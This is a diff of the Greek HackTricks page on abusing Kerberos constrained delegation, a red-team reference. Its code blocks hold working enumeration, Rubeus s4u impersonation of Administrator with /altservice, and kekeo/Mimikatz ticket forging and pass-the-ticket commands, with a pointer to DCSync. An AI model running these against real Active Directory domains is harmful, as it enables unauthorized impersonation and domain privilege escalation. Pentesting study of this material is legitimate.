@@ -1,35 +1,36 @@
-# Περιορισμένη Ανάθεση
+# Constrained Delegation
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
-
-* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα χάκινγκ τρικς σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## Περιορισμένη Ανάθεση
+## Constrained Delegation
 
-Χρησιμοποιώντας αυτό, ένας διαχειριστής του τομέα μπορεί να **επιτρέψει** σε έναν υπολογιστή να **προσομοιώσει έναν χρήστη ή υπολογιστή** εναντίον ενός **υπηρεσίας** ενός μηχανήματος.
+Χρησιμοποιώντας αυτό, ένας διαχειριστής τομέα μπορεί να **επιτρέψει** σε έναν υπολογιστή να **παριστάνει έναν χρήστη ή υπολογιστή** απέναντι σε μια **υπηρεσία** μιας μηχανής.
 
-* **Υπηρεσία για τον χρήστη για τον εαυτό του (**_**S4U2self**_**):** Εάν ένας **λογαριασμός υπηρεσίας** έχει μια τιμή _userAccountControl_ που περιέχει [TRUSTED\_TO\_AUTH\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) (T2A4D), τότε μπορεί να λάβει ένα TGS για τον εαυτό του (την υπηρεσία) εκ μέρους οποιουδήποτε άλλου χρήστη.
-* **Υπηρεσία για τον χρήστη για τον Διαμεσολαβητή(**_**S4U2proxy**_**):** Ένας **λογαριασμός υπηρεσίας** μπορεί να λάβει ένα TGS εκ μέρους οποιουδήποτε χρήστη για την υπηρεσία που έχει οριστεί στο **msDS-AllowedToDelegateTo**. Για να το κάνει αυτό, πρέπει πρώτα να λάβει ένα TGS από αυτόν τον χρήστη για τον εαυτό του, αλλά μπορεί να χρησιμοποιήσει το S4U2self για να λάβει αυτό το TGS πριν ζητήσει το άλλο.
+* **Υπηρεσία για Χρήστη για τον εαυτό του (**_**S4U2self**_**):** Εάν ένας **λογαριασμός υπηρεσίας** έχει μια τιμή _userAccountControl_ που περιέχει [TRUSTED\_TO\_AUTH\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) (T2A4D), τότε μπορεί να αποκτήσει ένα TGS για τον εαυτό του (την υπηρεσία) εκ μέρους οποιουδήποτε άλλου χρήστη.
+* **Υπηρεσία για Χρήστη για Proxy(**_**S4U2proxy**_**):** Ένας **λογαριασμός υπηρεσίας** θα μπορούσε να αποκτήσει ένα TGS εκ μέρους οποιουδήποτε χρήστη για την υπηρεσία που έχει οριστεί στο **msDS-AllowedToDelegateTo.** Για να το κάνει αυτό, χρειάζεται πρώτα ένα TGS από αυτόν τον χρήστη για τον εαυτό του, αλλά μπορεί να χρησιμοποιήσει το S4U2self για να αποκτήσει αυτό το TGS πριν ζητήσει το άλλο.
 
-**Σημείωση**: Εάν ένας χρήστης είναι σημειωμένος ως "_Ο λογαριασμός είναι ευαίσθητος και δεν μπορεί να ανατεθεί_", δεν θα μπορείτε να τον προσομοιώσετε.
+**Σημείωση**: Εάν ένας χρήστης είναι σημειωμένος ως ‘_Ο λογαριασμός είναι ευαίσθητος και δεν μπορεί να ανατεθεί_’ στο AD, δεν θα **μπορείτε να τον παριστάνετε**.
 
-Αυτό σημαίνει ότι εάν **καταλάβετε το hash της υπηρεσίας** μπορείτε να **προσομοιώσετε χρήστες** και να αποκτήσετε **πρόσβαση** εκ μέρους τους στην **υπηρεσία που έχει ρυθμιστεί** (δυνατή **ανέλιξη προνομίων**).
+Αυτό σημαίνει ότι αν **συμβιβάσετε το hash της υπηρεσίας** μπορείτε να **παριστάνετε χρήστες** και να αποκτήσετε **πρόσβαση** εκ μέρους τους στην **υπηρεσία που έχει ρυθμιστεί** (πιθανή **privesc**).
 
-Επιπλέον, δεν θα έχετε πρόσβαση μόνο στην υπηρεσία που ο χρήστης μπορεί να προσομοιώσει, αλλά και σε οποιαδήποτε άλλη υπηρεσία, επειδή δεν ελέγχεται το SPN (το όνομα της υπηρεσίας που ζητείται), μόνο τα προνόμια. Επομένως, εάν έχετε πρόσβαση στην **υπηρεσία CIFS** μπορείτε επίσης να έχετε πρόσβαση στην **υπηρεσία HOST** χρησιμοποιώντας την σημαία `/altservice` στο Rubeus.
+Επιπλέον, **δεν θα έχετε μόνο πρόσβαση στην υπηρεσία που μπορεί να παριστάνει ο χρήστης, αλλά και σε οποιαδήποτε υπηρεσία** επειδή το SPN (το όνομα της υπηρεσίας που ζητείται) δεν ελέγχεται, μόνο τα δικαιώματα. Επομένως, αν έχετε πρόσβαση στην **υπηρεσία CIFS** μπορείτε επίσης να έχετε πρόσβαση στην **υπηρεσία HOST** χρησιμοποιώντας την επιλογή `/altservice` στο Rubeus.
 
-Επίσης, η πρόσβαση στην **υπηρεσία LDAP στον DC**, είναι αυτό που χρειάζεται για να εκμεταλλευτείτε ένα **DCSync**.
+Επίσης, **η πρόσβαση στην υπηρεσία LDAP στον DC**, είναι αυτό που χρειάζεται για να εκμεταλλευτείτε ένα **DCSync**.
 
-{% code title="Απαρίθμηση" %}
+{% code title="Enumerate" %}
 ```bash
 # Powerview
 Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
@@ -38,7 +39,9 @@ Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowed
 #ADSearch
 ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
 ```
-{% code title="Λήψη TGT" %}
+{% endcode %}
+
+{% code title="Λάβετε TGT" %}
 ```bash
 # The first step is to get a TGT of the service that can impersonate others
 ## If you are SYSTEM in the server, you might take it from memory
@@ -60,12 +63,12 @@ tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140
 {% endcode %}
 
 {% hint style="warning" %}
-Υπάρχουν **άλλοι τρόποι για να αποκτήσετε ένα εισιτήριο TGT** ή το **RC4** ή **AES256** χωρίς να είστε SYSTEM στον υπολογιστή, όπως το Printer Bug και η απεριόριστη ανακατεύθυνση, η ανακατεύθυνση NTLM και η κατάχρηση της υπηρεσίας πιστοποίησης Active Directory Certificate.
+Υπάρχουν **άλλοι τρόποι για να αποκτήσετε ένα TGT ticket** ή το **RC4** ή **AES256** χωρίς να είστε SYSTEM στον υπολογιστή, όπως το Printer Bug και η unconstrained delegation, NTLM relaying και η κακή χρήση της Active Directory Certificate Service.
 
-**Απλά έχοντας αυτό το εισιτήριο TGT (ή κατακεκρυμμένο) μπορείτε να πραγματοποιήσετε αυτήν την επίθεση χωρίς να διακινδυνεύσετε ολόκληρο τον υπολογιστή.**
+**Απλά έχοντας αυτό το TGT ticket (ή hashed) μπορείτε να εκτελέσετε αυτή την επίθεση χωρίς να διακυβεύσετε ολόκληρο τον υπολογιστή.**
 {% endhint %}
 
-{% code title="Χρήση του Rubeus" %}
+{% code title="Using Rubeus" %}
 ```bash
 #Obtain a TGS of the Administrator user to self
 .\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator
@@ -82,6 +85,8 @@ tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140
 #Load ticket in memory
 .\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
 ```
+{% endcode %}
+
 {% code title="kekeo + Mimikatz" %}
 ```bash
 #Obtain a TGT for the Constained allowed user
@@ -97,16 +102,17 @@ Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.
 
 [**Περισσότερες πληροφορίες στο ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
 
+{% hint style="success" %}
+Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Υποστήριξη HackTricks</summary>
 
-Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
-
-* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
+* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
+* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
